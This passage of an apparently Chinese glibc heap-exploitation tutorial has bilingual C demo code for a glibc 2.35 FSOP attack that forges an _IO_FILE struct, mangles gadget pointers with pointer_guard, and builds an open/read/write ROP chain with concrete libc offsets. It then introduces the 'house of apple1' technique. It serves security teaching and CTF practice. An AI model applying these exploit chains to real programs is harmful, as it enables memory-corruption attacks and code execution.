class="string">&quot;\033[32m然后我们需要让这个值异或pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        *system_addr ^= *pointer_guard_address;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m异或之后[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to let it rol 0x11 bits.\n\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们循环左移0x11位:\n\033[0m&quot;</span>);</span><br><span class="line">        *system_addr = (*system_addr &lt;&lt; <span class="number">0x11</span>) + (*system_addr &gt;&gt; <span class="number">0x2f</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m循环左移后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mode == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou chose the orw mode.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你选择了orw模式。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mIMPORTANT: You must make sure that there is a flag file in this directory, or we&#x27;ll be unable to read.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m注意：你必须保证当前文件夹下有一个flag文件，否则该程序将无法读取。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn glibc 2.35, we usually use setcontext() function to trigger stack pivoting, but with a little difference from lower versions.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在glibc 2.35中，我们一般使用setcontext函数进行栈迁移，但与低版本的glibc的利用方式有一些小差别。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn lower version, the instruction that changes the rsp is: &#x27;mov rsp, [rdi+xx]&#x27;.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在低版本glibc中，修改rsp的指令为: &#x27;mov rsp, [rdi+xx]&#x27;.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe rdi here is our [fake _IO_FILE_plus struct + 0xe0].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的rdi是[fake _IO_FILE_plus struct + 0xe0].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut in glibc 2.35, the instruction was changed to: \033[31m&#x27;mov rsp, [rdx+xx]&#x27;\033[32m.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但是在glibc 2.35中，这条指令被修改为: \033[31m&#x27;mov rsp, [rdx+xx]&#x27;\033[32m.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we can&#x27;t change the value of rsp only by writing forged data in our fake _IO_FILE_plus struct.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们不能仅通过将假的数据写入到假的_IO_FILE_plus结构体而修改rsp的值。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHowever, we still have our way to exploit. It&#x27;s called pcop, which is just a unique gadget.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但我们依然能够进行漏洞利用，需要一个pcop，这是一个特殊的gadget。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTry to use this command below in the terminal: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以尝试在终端运行以下命令：: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;34mobjdump -d /lib/x86_64-linux-gnu/libc.so.6 -M intel | grep &#x27;1675b&#x27;\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou can see a gadget in offset \033[31m0x1675b0\033[32m: \033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你可以在偏移\033[31m0x1675b0\033[32m处看到有一个gadget: \033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  1675b0:       48 8b 57 08             mov    rdx,QWORD PTR [rdi+0x8]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;  1675b4:       48 89 04 24             mov    QWORD PTR [rsp],rax\n&quot;</span></span><br><span class="line">             <span class="string">&quot;  1675b8:       ff 52 20                call   QWORD PTR [rdx+0x20]\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt seems that we can use the value of [rdi+0x8] to change rdx to any value as we like.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们似乎可以使用[rdi+0x8]的值去修改rdx的值为任意值。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAnd then we can change the rip into [rdx+0x20].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们就可以将rip修改到[rdx+0x20]。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe can change rdx to a place that we can control, then write setcontext() address in it to trigger stack pivoting.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们可以将rdx修改到一个我们可以控制的地方，然后将setcontext函数的地址写进去来触发栈迁移。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTo keep the environment of heap, we use a space in bss segment to complete this process.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m为了保持堆环境，我们使用bss段的一块空间来完成这个过程。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of bss space is: \033[31m%p\033[32m.\033[0m\n&quot;</span>, &amp;space);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mbss对应地址为: \033[31m%p\033[32m.\033[0m\n\n&quot;</span>, &amp;space);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe let [rdi+0xe0] = bss address, [rdi+0xe8] = pcop address.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们让[rdi+0xe0] = bss的地址, [rdi+0xe8] = pcop的地址.\033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span>* bss_address = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of bss should be written in: \033[31m%p\n\033[0m&quot;</span>, bss_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个bss的地址应该被写入: \033[31m%p\n\033[0m&quot;</span>, bss_address);</span><br><span class="line">        *bss_address = (<span class="type">size_t</span>)(&amp;space);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *bss_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个指针的值现在为: \033[31m%#zx\033[0m\n&quot;</span>, *bss_address);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span>* pcop = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of pcop should be written in: \033[31m%p\n\033[0m&quot;</span>, pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mpcop的地址应该被写入到: \033[31m%p\n\033[0m&quot;</span>, pcop);</span><br><span class="line">        *pcop = (<span class="type">size_t</span>)(libc_base + <span class="number">0x1675b0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个指针现在的值为: \033[31m%#zx\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mDon&#x27;t forget we need to encrypt the pcop value.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m别忘了我们需要加密pcop的值。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后我们需要让pcop与pointer_guard异或: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        *pcop ^= *pointer_guard_address;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m异或之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m&quot;</span>, *pcop);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to let it rol 0x11 bits.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们让它循环左移0x11位。\033[0m&quot;</span>);</span><br><span class="line">        *pcop = (*pcop &lt;&lt; <span class="number">0x11</span>) + (*pcop &gt;&gt; <span class="number">0x2f</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m循环左移之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n&quot;</span>, *pcop);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow, we are ready to write something in our bss segment.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在我们准备写一些内容到bss段。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNoticing that the first instruction of pcop moves [rdi+0x8] to rdx, while rdi now is address of bss.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意到pcop的第一条指令将[rdi+0x8]的值移动到rdx，而rdi此时的值是bss处的地址。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSo that we can write the address of somewhere in bss to [rdi+0x8](%p).\033[0m&quot;</span>, &amp;(space[<span class="number">1</span>]));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m所以我们可以将任意地址写到[rdi+0x8](%p)这个bss段中的地址。.\033[0m&quot;</span>, &amp;(space[<span class="number">1</span>]));</span><br><span class="line">        space[<span class="number">1</span>] = (<span class="type">size_t</span>)space;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m[rdi+0x8] now is: \033[31m%#zx\033[32m.\n\033[0m&quot;</span>, space[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m[rdi+0x8]现在的值为: \033[31m%#zx\033[32m.\n\033[0m&quot;</span>, space[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to write address of setcontext into [rdx+0x20].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们需要写setcontext函数的地址到[rdx+0x20]。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHave a look at disassembly result of function setcontext: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m看一下setcontext函数的汇编: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[34m.text:0000000000053A6D                 \033[1;31mmov     rsp, [rdx+0A0h]\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A74                 mov     rbx, [rdx+80h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A7B                 mov     rbp, [rdx+78h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A7F                 mov     r12, [rdx+48h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A83                 mov     r13, [rdx+50h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A87                 mov     r14, [rdx+58h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A8B                 mov     r15, [rdx+60h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A8F                 test    dword ptr fs:48h, 2\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A9B                 jz      loc_53B56\n&quot;</span></span><br><span class="line">             <span class="string">&quot;\t\t\t......\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B56                 \033[1;31mmov     rcx, [rdx+0A8h]\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B5D                 \033[1;31mpush    rcx\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B5E                 mov     rsi, [rdx+70h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B62                 mov     rdi, [rdx+68h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B66                 mov     rcx, [rdx+98h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B6D                 mov     r8, [rdx+28h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B71                 mov     r9, [rdx+30h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B75                 mov     rdx, [rdx+88h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B75 ; &#125; // starts at 53A30\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7C ; __unwind &#123;\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7C                 xor     eax, eax\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7E                 retn\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe let [rdx+0xa0] = bss + 0x100, and let [rdx+0xa8] = some gadget address as the start of our ROP chain.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们让[rdx+0xa0] = bss + 0x100, 让[rdx+0xa8] = 某些gadget的地址作为ROP链的开始。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThere are some useful gadgets: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里是一些有用的gadget地址: \033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> poprdi_ret = libc_base + <span class="number">0x2a3e5</span>;</span><br><span class="line">        <span class="type">size_t</span> poprsi_ret = libc_base + <span class="number">0x2be51</span>;</span><br><span class="line">        <span class="type">size_t</span> poprdx_rbx_ret = libc_base + <span class="number">0x90529</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rdi ; ret : %#zx\n\033[0m&quot;</span>, poprdi_ret);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rsi ; ret : %#zx\n\033[0m&quot;</span>, poprsi_ret);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rdx ; pop rbx ; ret : %#zx\n\033[0m&quot;</span>, poprdx_rbx_ret);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere are some key functions: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里是一些关键函数的地址: \033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> readfunc_addr = (<span class="type">size_t</span>)read;</span><br><span class="line">        <span class="type">size_t</span> writefunc_addr = (<span class="type">size_t</span>)write;</span><br><span class="line">        <span class="type">size_t</span> openfunc_addr = (<span class="type">size_t</span>)open;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mopen(): %#zx\n\033[0m&quot;</span>, openfunc_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mread(): %#zx\n\033[0m&quot;</span>, readfunc_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mwrite(): %#zx\n\033[0m&quot;</span>, writefunc_addr);</span><br><span class="line"></span><br><span class="line">        space[<span class="number">0x20</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(libc_base + <span class="number">0x53a6d</span>);</span><br><span class="line">        space[<span class="number">0xa0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0x100</span> / <span class="number">8</span>]);</span><br><span class="line">        space[<span class="number">0xa8</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s construct our ROP chain.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们来构造ROP链。\033[0m&quot;</span>);</span><br><span class="line">        space[<span class="number">0x100</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)flag;</span><br><span class="line">        space[<span class="number">0x108</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x110</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x118</span> / <span class="number">8</span>] = openfunc_addr;</span><br><span class="line">        space[<span class="number">0x120</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line">        space[<span class="number">0x128</span> / <span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">        space[<span class="number">0x130</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x138</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0xf0</span>]);</span><br><span class="line">        space[<span class="number">0x140</span> / <span class="number">8</span>] = poprdx_rbx_ret;</span><br><span class="line">        space[<span class="number">0x148</span> / <span class="number">8</span>] = <span class="number">0x40</span>;</span><br><span class="line">        space[<span class="number">0x150</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x158</span> / <span class="number">8</span>] = readfunc_addr;</span><br><span class="line">        space[<span class="number">0x160</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line">        space[<span class="number">0x168</span> / <span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">        space[<span class="number">0x170</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x178</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0xf0</span>]);</span><br><span class="line">        space[<span class="number">0x180</span> / <span class="number">8</span>] = poprdx_rbx_ret;</span><br><span class="line">        space[<span class="number">0x188</span> / <span class="number">8</span>] = <span class="number">0x40</span>;</span><br><span class="line">        space[<span class="number">0x190</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x198</span> / <span class="number">8</span>] = writefunc_addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere is the former part of bss spare space:\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m下面是bss空闲区域前面的一部分:\033[0m&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x20</span>; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m+%#5x\t\t%#18zx\t\t%#18zx\n\033[0m&quot;</span>, i * <span class="number">0x10</span>, space[<span class="number">2</span>*i], space[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31mError: invalid exploit mode!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m错误：选择了无效的利用模式！\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[032mThen, we need to \033[31mchange the size of top chunk to make it unaligned, and malloc a big space.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[032m然后，我们需要\033[31m修改top chunk的大小来让它不对齐，然后malloc一块大空间。\033[0m&quot;</span>);</span><br><span class="line">    *top_chunk_size = <span class="number">0x101</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of top_chunk-&gt;size was changed into: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m现在top_chunk-&gt;size的值被修改为: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen, change the value of stderr pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后，修改stderr指针的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: *stderr_pointer = \033[33m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改之前: *stderr_pointer = \033[33m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    *(<span class="type">size_t</span>*)stderr_ptr = (<span class="type">size_t</span>)fake_file_struct;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: *stderr_pointer = \033[31m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改之后: *stderr_pointer = \033[31m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAnd the last step: malloc(0x200) to trigger sysmalloc.\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后是最后一步：malloc(0x200)触发sysmalloc。\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a><a class="link"   href="https://bbs.kanxue.com/thread-273418.htm" >house of apple1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p><strong>前置条件</strong></p>
<ul>
<li><code>glibc &gt;= 2.23</code>。</li>
<li>程序从 <code>main</code> 函数返回或能调用 <code>exit</code> 函数。</li>
<li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址。</li>
<li>能使用一次 <code>largebin attack</code>。</li>
</ul>
<h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>当程序从<code>main</code>函数返回或者执行<code>exit</code>函数的时候，均会调用<code>fcloseall</code>函数。</p>
<p>该调用链为：<code>exit -&gt; fcloseall-&gt;_IO_cleanup -&gt;_IO_flush_all_lockp -&gt;_IO_OVERFLOW</code>。</p>
<p>最后会遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，如果满足 <code>FSOP</code> 条件的话，会调用每个结构体中<code>vtable-&gt;_overflow</code>函数指针指向的函数。使用 <code>largebin attack</code> 可以劫持 <code>_IO_list_all</code> 变量，将其替换为伪造的<code>IO_FILE</code>结构体。</p>
<p><code>apple1</code> 主要利用了 <code>IO_FILE</code> 中的 <code>_wide_data</code> 指针成员，其指向结构体 <code>_IO_wide_data</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>_IO_wstrn_overflow</code> 函数中会在 <code>_wide_data</code> 指向的内存中写入连续 8 个 <code>snf-&gt;overflow_buf</code> 开始或结束位置的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*绕过点 2 */</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE 